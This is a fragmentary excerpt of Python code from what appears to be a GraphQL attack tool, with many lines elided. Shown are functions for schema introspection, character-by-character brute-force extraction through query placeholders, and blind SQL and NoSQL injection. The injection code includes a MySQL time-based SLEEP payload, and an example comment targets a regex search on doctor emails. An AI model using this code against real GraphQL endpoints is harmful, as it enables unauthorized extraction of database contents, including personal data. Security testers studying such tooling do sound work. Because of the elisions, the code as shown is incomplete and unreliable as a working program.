...
def display_types(URL, method, headers, use_json, proxies):
    payload = "{__schema{types{name}}}"
    r = requester(URL, method, payload, headers, use_json, proxies)
    if r is not None:
        schema = r.json()
...
def dump_schema(url, method, graphversion, headers, use_json, proxies):
    """
...
def exec_graphql(url, method, query, headers=None, use_json=False, only_length=0, proxies=None):
    if headers is None:
        headers = {}
    r = requester(url, method, query, headers, use_json, proxies)
    try:
        graphql = r.json()
...
def exec_advanced(url, method, query, headers, use_json, proxies):
    print(query)
    ...
    if "GRAPHQL_CHARSET" in query:
        ...
        for c in graphql_charset:
            length = exec_graphql(url, method, query.replace("GRAPHQL_CHARSET", c), headers, use_json, only_length=1, proxies=None)
            print(
    ...
    # e.g: {doctors(options: 1, search: "{ \"email\":{ \"$regex\": \"Maxine3GRAPHQL_INCREMENT_10@yahoo.com\"} }"){id, lastName, email}}
        ...
        for i in range(int(match[0])):
            ...
            length = exec_graphql(url, method, query.replace(pattern, str(i)), headers, use_json, only_length=1, proxies=None)
    ...
    # Otherwise execute the query and display the JSON result
        ...
        print(exec_graphql(url, method, query, headers, use_json, proxies=proxies))


def blind_postgresql(url, method, headers, use_json, proxies):
    query = input("Query > ")
    ...
    requester(url, method, injected, headers, use_json, proxies)
    print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))


def blind_mysql(url, method, headers, use_json, proxies):
    query = input("Query > ")
    payload = "'-SLEEP(30); #"
    print("\033[92m[+] Started at: {}\033[0m".format(time.asctime(time.localtime(time.time()))))
    injected = (url.format(query)).replace("BLIND_PLACEHOLDER", payload)
...
def blind_mssql(url, method, headers, use_json, proxies):
    query = input("Query > ")
...
def blind_nosql(url, method, headers, use_json, proxies):
    ...
    while (_break == False):
        ...
        for c in charset:
            ...
            r = requester(url, method, injected, headers, use_json, proxies)
            if check in r.text:
                data += c
